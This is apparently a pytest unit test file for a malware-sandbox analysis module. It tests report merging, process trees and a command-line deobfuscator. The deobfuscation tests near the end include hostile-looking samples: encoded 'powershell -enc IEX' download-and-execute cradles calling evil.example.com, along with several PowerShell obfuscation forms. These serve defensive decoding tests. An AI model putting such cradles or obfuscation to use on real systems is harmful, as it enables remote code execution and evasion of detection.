import base64
import logging

import pytest

from saq.analysis.analysis import Analysis
from saq.analysis.root import RootAnalysis
from saq.constants import DIRECTIVE_NO_SANDBOX, DIRECTIVE_SANDBOX_FORCE, F_MD5, F_SHA256
from saq.modules.config import AnalysisModuleConfig
from saq.modules.sandbox import *
from saq.modules.sandbox import SandboxAnalysisModule, SandboxAnalysisModuleConfig


def _make_file_observable(tmp_path, file_name, content, forced):
    root = RootAnalysis(storage_dir=str(tmp_path / "root"))
    root.initialize_storage()
    path = root.create_file_path(file_name)
    with open(path, "w") as fp:
        fp.write(content)
    observable = root.add_file_observable(path)
    if forced:
        observable.add_directive(DIRECTIVE_SANDBOX_FORCE)
    return observable


@pytest.mark.unit
def test_should_sandbox_file_forced_bypasses_file_type_check(tmp_path):
    module = _make_configured_module(supported_extensions=["exe"])
    observable = _make_file_observable(tmp_path, "evil.html", "<html><script>alert(1)</script></html>", forced=True)

    assert not module.is_sandboxable_file(observable.full_path)
    assert module.should_sandbox_file(observable, observable.full_path) is True


@pytest.mark.unit
def test_should_sandbox_file_not_forced_delegates_to_is_sandboxable_file(tmp_path):
    module = _make_configured_module(supported_extensions=["exe"])
    observable = _make_file_observable(tmp_path, "test.exe", "MZ", forced=False)

    assert module.should_sandbox_file(observable, observable.full_path) is True


@pytest.mark.unit
def test_should_sandbox_file_not_forced_and_not_sandboxable_returns_false(tmp_path):
    module = _make_configured_module(supported_extensions=["exe"])
    observable = _make_file_observable(tmp_path, "notes.txt", "just some notes", forced=False)

    assert module.should_sandbox_file(observable, observable.full_path) is False


def _make_configured_module(config_class=SandboxAnalysisModuleConfig, **kwargs):
    """Build a SandboxAnalysisModule without running __init__, with only its config set."""
    module = object.__new__(SandboxAnalysisModule)
    module.config = config_class(
        name="test_sandbox", python_module="saq.modules.sandbox", python_class="SandboxAnalysisModule",
        enabled=True, **kwargs)
    return module


@pytest.mark.unit
def test_sandbox_config_defaults():
    module = _make_configured_module()

    assert module.use_proxy is True
    assert module.verify_ssl is True
    assert module.supported_extensions == []


@pytest.mark.unit
def test_sandbox_config_values_are_honored():
    module = _make_configured_module(use_proxy=False, verify_ssl=False, supported_extensions=["EXE", " dll "])

    assert module.use_proxy is False
    assert module.verify_ssl is False
    assert module.supported_extensions == ["exe", "dll"]


@pytest.mark.unit
def test_sandbox_config_accepts_comma_separated_extensions():
    module = _make_configured_module(supported_extensions="EXE, dll")

    assert module.config.supported_extensions == ["exe", "dll"]
    assert module.supported_extensions == ["exe", "dll"]


@pytest.mark.unit
def test_sandbox_plain_config_uses_defaults():
    # an integration subclass may declare a config class that does not extend SandboxAnalysisModuleConfig
    module = _make_configured_module(config_class=AnalysisModuleConfig)

    assert module.use_proxy is True
    assert module.verify_ssl is True
    assert module.supported_extensions == []


@pytest.mark.unit
def test_is_sandboxable_file_supported_extension():
    module = _make_configured_module(supported_extensions=["xyz"])

    # the extension check returns before the file is opened
    assert module.is_sandboxable_file("/nonexistent/sample.XYZ") is True


@pytest.mark.unit
def test_proxies_empty_when_proxy_disabled():
    module = _make_configured_module(use_proxy=False)

    assert module.proxies == {}


@pytest.mark.unit
def test_contacted_host():
    c1 = ContactedHost(ip='192.168.1.1', port='80')
    c2 = ContactedHost(ip='192.168.1.1', port='80', protocol='TCP', associated_domains=['localhost.localdomain'])

    assert c1 == c2
    assert c1.json == {
        'ip': '192.168.1.1',
        'port': '80',
        'protocol': '',
        'location': '',
        'associated_domains': []
    }


@pytest.mark.unit
def test_contacted_host_list():
    c1 = ContactedHost(ip='192.168.1.1', port='80')
    c2 = ContactedHost(ip='192.168.1.1', port='80', protocol='TCP', associated_domains=['localhost.localdomain'])

    c_list = ContactedHostList()
    c_list.append(c1)
    c_list.append(c2)

    assert len(c_list) == 1
    assert c_list[0].protocol == 'TCP'
    assert c_list[0].associated_domains == ['localhost.localdomain']


@pytest.mark.unit
def test_dns_request():
    d1 = DnsRequest(request='localhost.localdomain', type='A')
    d2 = DnsRequest(request='localhost.localdomain', type='A', answer='192.168.1.1', answer_type='A')

    assert d1 == d2
    assert d1.json == {
        'request': 'localhost.localdomain',
        'type': 'A',
        'answer': '',
        'answer_type': ''
    }


@pytest.mark.unit
def test_dns_request_list():
    d1 = DnsRequest(request='localhost.localdomain', type='A', answer='192.168.1.1')
    d2 = DnsRequest(request='localhost.localdomain', type='A', answer='192.168.1.1', answer_type='A')

    d_list = DnsRequestList()
    d_list.append(d1)
    d_list.append(d2)

    assert len(d_list) == 1
    assert d_list[0].answer_type == 'A'


@pytest.mark.unit
def test_dropped_file():
    f1 = DroppedFile(filename='calc.exe', md5='d41d8cd98f00b204e9800998ecf8427e')
    f2 = DroppedFile(filename='calc.exe', md5='d41d8cd98f00b204e9800998ecf8427e', sha1='da39a3ee5e6b4b0d3255bfef95601890afd80709')

    assert f1 == f2
    assert f1.json == {
        'filename': 'calc.exe',
        'path': '',
        'size': '',
        'type': '',
        'md5': 'd41d8cd98f00b204e9800998ecf8427e',
        'sha1': '',
        'sha256': '',
        'sha512': '',
        'ssdeep': ''
    }


@pytest.mark.unit
def test_dropped_file_list():
    f1 = DroppedFile(filename='calc.exe', md5='d41d8cd98f00b204e9800998ecf8427e')
    f2 = DroppedFile(filename='calc.exe', md5='d41d8cd98f00b204e9800998ecf8427e', sha1='da39a3ee5e6b4b0d3255bfef95601890afd80709')

    f_list = DroppedFileList()
    f_list.append(f1)
    f_list.append(f2)

    assert len(f_list) == 1
    assert f_list[0].sha1 == 'da39a3ee5e6b4b0d3255bfef95601890afd80709'


@pytest.mark.unit
def test_http_request():
    h1 = HttpRequest(host='localhost.localdomain', port='80', uri='/index.html', method='GET')
    h2 = HttpRequest(host='localhost.localdomain', port='80', uri='/index.html', method='GET', user_agent='Test')

    assert h1 == h2
    assert h1.json == {
        'host': 'localhost.localdomain',
        'port': '80',
        'uri': '/index.html',
        'url': 'http://localhost.localdomain/index.html',
        'method': 'GET',
        'user_agent': ''
    }


@pytest.mark.unit
def test_http_request_list():
    h1 = HttpRequest(host='localhost.localdomain', port='80', uri='/index.html', method='GET')
    h2 = HttpRequest(host='localhost.localdomain', port='80', uri='/index.html', method='GET', user_agent='Test')

    h_list = HttpRequestList()
    h_list.append(h1)
    h_list.append(h2)

    assert len(h_list) == 1
    assert h_list[0].user_agent == 'Test'


@pytest.mark.unit
def test_process():
    p1 = Process(command='excel.exe', pid='1234')
    p2 = Process(command='excel.exe', pid='1234', parent_pid='5678')

    assert p1 == p2
    assert p1.json == {
        'command': 'excel.exe',
        'decoded_command': 'excel.exe',
        'pid': '1234',
        'parent_pid': '',
        'urls': []
    }


@pytest.mark.unit
def test_process_list():
    p1 = Process(command='excel.exe', pid='1234')
    p2 = Process(command='excel.exe', pid='1234', parent_pid='5678')

    p_list = ProcessList()
    p_list.append(p1)
    p_list.append(p2)

    assert len(p_list) == 1
    assert p_list[0].parent_pid == '5678'


@pytest.mark.unit
def test_merge_sandbox_reports():
    report1 = GenericSandboxReport()
    report1.contacted_hosts.append(ContactedHost(ip='192.168.1.1', port='80'))
    report1.dns_requests.append(DnsRequest(request='localhost.localdomain', type='A'))
    report1.dropped_files.append(DroppedFile(filename='index.dat', md5='d41d8cd98f00b204e9800998ecf8427e'))
    report1.filename = 'calc.exe'
    report1.http_requests.append(HttpRequest(host='localhost.localdomain', port='80', uri='/index.html', method='GET'))
    report1.malware_family = 'Derp'
    report1.md5 = 'd41d8cd98f00b204e9800998ecf8427e'
    report1.mutexes = ['Mutex1']
    report1.processes.append(Process(command='calc.exe', pid='1234'))
    report1.sandbox_urls = ['http://sandbox1/sample/calc.exe']
    report1.suricata_alerts = ['Suricata Alert 1']

    report2 = GenericSandboxReport()
    report2.contacted_hosts.append(ContactedHost(ip='192.168.1.1', port='80', protocol='TCP'))
    report2.created_services = ['Calculator']
    report2.filename = 'sample.exe'
    report2.http_requests.append(HttpRequest(host='localhost.localdomain', port='80', uri='/index.php', method='POST'))
    report2.md5 = 'd41d8cd98f00b204e9800998ecf8427e'
    report2.mutexes = ['Mutex2']
    report2.processes.append(Process(command='calc.exe', pid='1234', parent_pid='5678'))
    report2.sandbox_urls = ['http://sandbox2/sample/calc.exe']

    merged = merge_sandbox_reports([report1.json, report2.json])

    assert merged == {
        'contacted_hosts': [
            {
                'ip': '192.168.1.1',
                'port': '80',
                'protocol': 'TCP',
                'location': '',
                'associated_domains': []
            }
        ],
        'created_services': ['Calculator'],
        'dns_requests': [
            {
                'request': 'localhost.localdomain',
                'type': 'A',
                'answer': '',
                'answer_type': ''
            }
        ],
        'dropped_files': [
            {
                'filename': 'index.dat',
                'path': '',
                'size': '',
                'type': '',
                'md5': 'd41d8cd98f00b204e9800998ecf8427e',
                'sha1': '',
                'sha256': '',
                'sha512': '',
                'ssdeep': ''
            }
        ],
        'filename': 'calc.exe',
        'http_requests': [
            {
                'host': 'localhost.localdomain',
                'port': '80',
                'uri': '/index.html',
                'url': 'http://localhost.localdomain/index.html',
                'method': 'GET',
                'user_agent': ''
            },
            {
                'host': 'localhost.localdomain',
                'port': '80',
                'uri': '/index.php',
                'url': 'http://localhost.localdomain/index.php',
                'method': 'POST',
                'user_agent': ''
            }
        ],
        'malware_family': 'Derp',
        'md5': 'd41d8cd98f00b204e9800998ecf8427e',
        'memory_strings': [],
        'memory_urls': [],
        'mutexes': ['Mutex1', 'Mutex2'],
        'process_tree_urls': [],
        'process_trees': ['calc.exe\n'],
        'process_trees_decoded': ['calc.exe\n'],
        'processes': [
            {
                'command': 'calc.exe',
                'decoded_command': 'calc.exe',
                'pid': '1234',
                'parent_pid': '5678',
                'urls': []
            }
        ],
        'registry_keys': [],
        'resolved_apis': [],
        'sandbox_urls': ['http://sandbox1/sample/calc.exe', 'http://sandbox2/sample/calc.exe'],
        'sha1': '',
        'sha256': '',
        'sha512': '',
        'ssdeep': '',
        'started_services': [],
        'strings_urls': [],
        'suricata_alerts': ['Suricata Alert 1']
    }


@pytest.mark.unit
def test_custom_requirement_honors_no_sandbox(tmp_path):
    module = _make_configured_module()
    observable = _make_file_observable(tmp_path, "sample.exe", "MZ", forced=False)

    assert module.custom_requirement(observable)
    observable.add_directive(DIRECTIVE_NO_SANDBOX)
    assert not module.custom_requirement(observable)


@pytest.mark.unit
def test_proxies_uses_configured_proxy(monkeypatch):
    monkeypatch.setattr("saq.modules.sandbox.proxies", lambda: {"https": "http://proxy:3128"})

    assert _make_configured_module().proxies == {"https": "http://proxy:3128"}


@pytest.mark.unit
@pytest.mark.parametrize("file_name,content,expected", [
    ("sample.bin", b"MZ\x90\x00", True),
    ("sample.bin", b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1" + b"\x00" * 504, True),
    ("sample.bin", b"{\\rtf1 hello}", True),
    ("sample.bin", b"%PDF-1.7\n", True),
    # is_pdf_file wants "%PDF-", the header check takes "%PDF" anywhere in the first 1024 bytes
    ("sample.bin", b"junk %PDF without a version", True),
    ("sample.bin", b"just some text", False),
    # a sandbox gains nothing from an image
    ("sample.gif", b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00"
                   b",\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;", False),
])
def test_is_sandboxable_file_by_content(tmp_path, file_name, content, expected):
    path = tmp_path / file_name
    path.write_bytes(content)

    assert _make_configured_module().is_sandboxable_file(str(path)) is expected


class _SandboxTestAnalysis(Analysis):
    pass


class _HashTestModule(SandboxAnalysisModule):
    @property
    def generated_analysis_type(self):
        return _SandboxTestAnalysis


@pytest.mark.unit
def test_hash_has_been_analyzed(tmp_path, monkeypatch):
    from saq.modules.file_analysis import FileHashAnalysis

    root = RootAnalysis(storage_dir=str(tmp_path / "root"))
    root.initialize_storage()
    path = root.create_file_path("analyzed.exe")
    with open(path, "w") as fp:
        fp.write("MZ")
    analyzed = root.add_file_observable(path)
    hash_analysis = FileHashAnalysis()
    hash_analysis.md5 = "a" * 32
    hash_analysis.sha256 = "b" * 64
    analyzed.add_analysis(hash_analysis)
    analyzed.add_analysis(_SandboxTestAnalysis())

    # same hash, but this file was never sent to the sandbox
    path = root.create_file_path("not_analyzed.exe")
    with open(path, "w") as fp:
        fp.write("MZ!")
    not_analyzed = root.add_file_observable(path)
    other_hash = FileHashAnalysis()
    other_hash.md5 = "c" * 32
    other_hash.sha256 = "d" * 64
    not_analyzed.add_analysis(other_hash)

    module = object.__new__(_HashTestModule)
    monkeypatch.setattr(module, "get_root", lambda: root, raising=False)

    assert module.hash_has_been_analyzed(F_MD5, "a" * 32)
    assert module.hash_has_been_analyzed(F_SHA256, "b" * 64)
    assert not module.hash_has_been_analyzed(F_MD5, "c" * 32)
    assert not module.hash_has_been_analyzed(F_SHA256, "e" * 64)


@pytest.mark.unit
def test_contacted_hosts_do_not_share_domains():
    first = ContactedHost(ip='192.168.1.1', port='80')
    first.associated_domains.append('evil.example')

    assert ContactedHost(ip='192.168.1.2', port='80').associated_domains == []


@pytest.mark.unit
def test_contacted_host_list_merges_domains_and_accepts_dicts():
    h_list = ContactedHostList()
    h_list.append({'ip': '192.168.1.1', 'port': '443', 'protocol': '', 'location': '',
                   'associated_domains': ['a.example']})
    h_list.append(ContactedHost(ip='192.168.1.1', port='443', protocol='TCP', location='US',
                                associated_domains=['b.example']))

    assert len(h_list) == 1
    assert h_list[0].protocol == 'TCP'
    assert h_list[0].location == 'US'
    assert sorted(h_list[0].associated_domains) == ['a.example', 'b.example']


@pytest.mark.unit
@pytest.mark.parametrize("list_class,entry,message", [
    (ContactedHostList, {'ip': '192.168.1.1'}, 'invalid contacted host'),
    (DnsRequestList, {'request': 'a.example'}, 'invalid DNS request'),
    (DroppedFileList, {'filename': 'a.exe'}, 'invalid dropped file'),
    (HttpRequestList, {'host': 'a.example'}, 'invalid HTTP request'),
    (ProcessList, {'command': 'a.exe'}, 'invalid process'),
])
def test_report_lists_skip_incomplete_dicts(caplog, list_class, entry, message):
    entries = list_class()
    entries.append(entry)

    assert len(entries) == 0
    assert any(r.levelno == logging.ERROR and message in r.getMessage() for r in caplog.records)


@pytest.mark.unit
def test_report_lists_accept_dicts():
    dns = DnsRequestList()
    dns.append({'request': 'a.example', 'type': 'A', 'answer': '', 'answer_type': ''})
    dns.append({'request': 'a.example', 'type': 'A', 'answer': '10.0.0.1', 'answer_type': 'A'})
    assert [d.json for d in dns] == [{'request': 'a.example', 'type': 'A', 'answer': '10.0.0.1', 'answer_type': 'A'}]

    dropped = DroppedFileList()
    dropped.append({'filename': 'a.exe', 'path': 'N/A', 'size': '', 'type': '', 'md5': 'f' * 32, 'sha1': '',
                    'sha256': '', 'sha512': '', 'ssdeep': ''})
    dropped.append(DroppedFile(filename='a.exe', path='C:\\a.exe', size='10', type='PE', md5='f' * 32, sha1='1' * 40,
                               sha256='2' * 64, sha512='3' * 128, ssdeep='3:a:b'))
    assert len(dropped) == 1
    assert dropped[0].path == 'C:\\a.exe'
    assert dropped[0].ssdeep == '3:a:b'

    http = HttpRequestList()
    http.append({'host': 'a.example.com:8080', 'port': '8080', 'uri': 'x', 'method': 'GET', 'user_agent': ''})
    assert http[0].host == 'a.example.com'
    assert http[0].url == 'http://a.example.com:8080/x'

    processes = ProcessList()
    processes.append({'command': 'a.exe', 'pid': '1', 'parent_pid': ''})
    processes.append({'command': 'a.exe', 'pid': '1', 'parent_pid': '4'})
    assert len(processes) == 1
    assert processes[0].parent_pid == '4'


@pytest.mark.unit
def test_http_request_url():
    assert HttpRequest(host='a.example.com', port='443', uri='/x').url == 'https://a.example.com/x'
    assert HttpRequest(host='a.example.com', port='', uri='/x').url == 'http://a.example.com/x'
    # not a valid url
    assert HttpRequest(host='', port='80', uri='/x').url == ''


@pytest.mark.unit
def test_decode_command_base64_chunks():
    utf8 = base64.b64encode(b'http://evil.example.com/payload').decode()
    utf16 = base64.b64encode('IEX http://evil.example.com/ps1'.encode('utf-16-le')).decode()

    assert Process(command=f'run.exe {utf8} /quiet').decoded_command == 'run.exe http://evil.example.com/payload /quiet'
    process = Process(command=f'powershell -enc {utf16}')
    assert process.decoded_command == 'powershell -enc IEX http://evil.example.com/ps1'
    assert process.urls == {'http://evil.example.com/ps1'}
    # b64decode raises a plain ValueError on non-ASCII text
    assert Process(command='notepad.exe Отчет.docx').decoded_command == 'notepad.exe Отчет.docx'
    assert Process(command='C:\\Users\\José\\a.exe /q').decoded_command == 'C:\\Users\\José\\a.exe /q'


@pytest.mark.unit
def test_decode_command_powershell_obfuscation():
    assert Process(command='powershell [char]73[char]69[char]88').decoded_command == 'powershell IEX'
    assert Process(command='powershell I`E`X').decoded_command == 'powershell IEX'
    assert Process(command="powershell ('I')+('EX')").decoded_command == 'powershell (IEX)'
    assert Process(command="powershell 'I'+'EX'").decoded_command == 'powershell IEX'


@pytest.mark.unit
def test_decode_command_format_string_in_powershell():
    # the quotes the format string is matched by used to be removed first, so a powershell command was never decoded
    command = 'powershell -c ("{1}{0}"-f\'ple.com/x\',\'http://evil.exam\')'

    assert Process(command=command).decoded_command == 'powershell -c http://evil.example.com/x'


@pytest.mark.unit
def test_decode_command_format_string_indexes():
    # a placeholder may repeat an item
    assert Process(command='cmd ("{1}{0}{1}"-f\'a\',\'b\')').decoded_command == 'cmd bab'
    # an index past the last item is left alone, it used to raise IndexError
    assert Process(command='cmd ("{0}{2}"-f\'a\',\'b\')').decoded_command == 'cmd ("{0}{2}"-f\'a\',\'b\')'
    # an item may contain a comma
    assert Process(command='cmd ("{0}{1}"-f\'a,b\',\'c\')').decoded_command == 'cmd a,bc'


@pytest.mark.unit
def test_decode_command_split_and_invoke():
    assert Process(command="cmd 'httpXevil.example'.split('X')").decoded_command == 'cmd  http evil.example .split(   )'
    assert Process(command="cmd 'aXb'.invoke('X')").decoded_command == 'cmd  a b .invoke(   )'
    # nothing to split on
    assert Process(command="cmd 'ab'.split()").decoded_command == "cmd 'ab'.split()"
    assert Process(command="cmd split this").decoded_command == "cmd split this"


@pytest.mark.unit
def test_make_process_tree():
    report = GenericSandboxReport()
    report.processes.append(Process(command='winword.exe', pid='100', parent_pid='4'))
    report.processes.append(Process(command='cmd.exe /c ' + base64.b64encode(b'whoami').decode(), pid='200',
                                    parent_pid='100'))
    report.processes.append(Process(command='conhost.exe', pid='300', parent_pid='200'))
    report.processes.append(Process(command='splwow64.exe', pid='400', parent_pid='100'))

    assert report.make_process_tree() == (
        'winword.exe\n'
        '    cmd.exe /c d2hvYW1p\n'
        '        conhost.exe\n'
        '    splwow64.exe\n')
    assert report.make_process_tree(decoded=True) == (
        'winword.exe\n'
        '    cmd.exe /c whoami\n'
        '        conhost.exe\n'
        '    splwow64.exe\n')


@pytest.mark.unit
def test_make_process_tree_with_reused_pid():
    # the third process reuses the first one's pid, which made the second its own grandchild and recursed forever
    report = GenericSandboxReport()
    report.processes.append(Process(command='a.exe', pid='100', parent_pid='4'))
    report.processes.append(Process(command='b.exe', pid='200', parent_pid='100'))
    report.processes.append(Process(command='c.exe', pid='100', parent_pid='200'))

    assert report.make_process_tree() == 'a.exe\n    b.exe\n        c.exe\n'
    assert report.json['process_trees'] == ['a.exe\n    b.exe\n        c.exe\n']
